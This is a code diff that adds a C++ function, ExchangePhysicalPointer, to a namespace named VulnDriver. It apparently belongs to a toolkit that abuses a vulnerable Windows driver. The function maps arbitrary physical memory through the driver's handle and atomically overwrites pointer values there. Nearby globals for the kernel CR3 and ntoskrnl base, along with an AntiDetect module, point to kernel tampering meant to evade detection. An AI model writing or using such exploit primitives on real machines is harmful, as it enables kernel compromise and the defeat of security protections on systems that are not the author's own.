@@ -538,6 +538,90 @@ namespace VulnDriver {
         return STATUS_SUCCESS;
     }
 
+    NTSTATUS ExchangePhysicalPointer(HANDLE device, ULONGLONG physAddr, PVOID newValue, PVOID* oldValue) {
+        const ULONGLONG start = GetTickCount64();
+        VLOG("ExchangePhysicalPointer enter device=%p phys=0x%llX new=%p old_out=%p pid=%lu tid=%lu",
+            device,
+            physAddr,
+            newValue,
+            oldValue,
+            GetCurrentProcessId(),
+            GetCurrentThreadId());
+
+        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
+            VLOG("ExchangePhysicalPointer reject invalid_handle device=%p phys=0x%llX elapsed_ms=%llu",
+                device,
+                physAddr,
+                VElapsedMs(start));
+            return STATUS_INVALID_HANDLE;
+        }
+        if ((physAddr & (sizeof(void*) - 1)) != 0) {
+            VLOG("ExchangePhysicalPointer reject unaligned phys=0x%llX align=0x%llX elapsed_ms=%llu",
+                physAddr,
+                static_cast<unsigned long long>(sizeof(void*)),
+                VElapsedMs(start));
+            return STATUS_DATATYPE_MISALIGNMENT;
+        }
+
+        PVOID mapped = nullptr;
+        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, 0x1000, &mapped);
+        VLOG("ExchangePhysicalPointer map status=0x%08X phys=0x%llX mapped=%p elapsed_ms=%llu",
+            static_cast<DWORD>(status),
+            physAddr,
+            mapped,
+            VElapsedMs(start));
+        if (!NT_SUCCESS(status)) {
+            return status;
+        }
+
+        PVOID previousValue = nullptr;
+        __try {
+            ULONG offset = static_cast<ULONG>(physAddr & 0xFFF);
+            volatile LONG64* slot = reinterpret_cast<volatile LONG64*>(static_cast<PUCHAR>(mapped) + offset);
+            LONG64 newBits = static_cast<LONG64>(reinterpret_cast<ULONG_PTR>(newValue));
+            VLOG("ExchangePhysicalPointer before_exchange phys=0x%llX mapped=%p slot=%p new=%p elapsed_ms=%llu",
+                physAddr,
+                mapped,
+                const_cast<LONG64*>(slot),
+                newValue,
+                VElapsedMs(start));
+            LONG64 oldBits = InterlockedExchange64(slot, newBits);
+            previousValue = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(oldBits));
+            AntiDetect::MemoryBarrier();
+            VLOG("ExchangePhysicalPointer after_exchange phys=0x%llX mapped=%p slot=%p old=%p new=%p elapsed_ms=%llu",
+                physAddr,
+                mapped,
+                const_cast<LONG64*>(slot),
+                previousValue,
+                newValue,
+                VElapsedMs(start));
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            DWORD code = GetExceptionCode();
+            NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
+            VLOG("ExchangePhysicalPointer exception code=0x%08X phys=0x%llX mapped=%p unmap_status=0x%08X elapsed_ms=%llu",
+                code,
+                physAddr,
+                mapped,
+                static_cast<DWORD>(unmapStatus),
+                VElapsedMs(start));
+            return STATUS_ACCESS_VIOLATION;
+        }
+
+        NTSTATUS unmapStatus = UnmapPhysicalMemory(device, mapped);
+        if (oldValue) {
+            *oldValue = previousValue;
+        }
+        VLOG("ExchangePhysicalPointer exit status=0x%08X unmap_status=0x%08X phys=0x%llX old=%p new=%p elapsed_ms=%llu",
+            static_cast<DWORD>(STATUS_SUCCESS),
+            static_cast<DWORD>(unmapStatus),
+            physAddr,
+            previousValue,
+            newValue,
+            VElapsedMs(start));
+        return STATUS_SUCCESS;
+    }
+
     static ULONGLONG g_KernelCR3 = 0;
     static ULONGLONG g_NtoskrnlBase = 0;
 
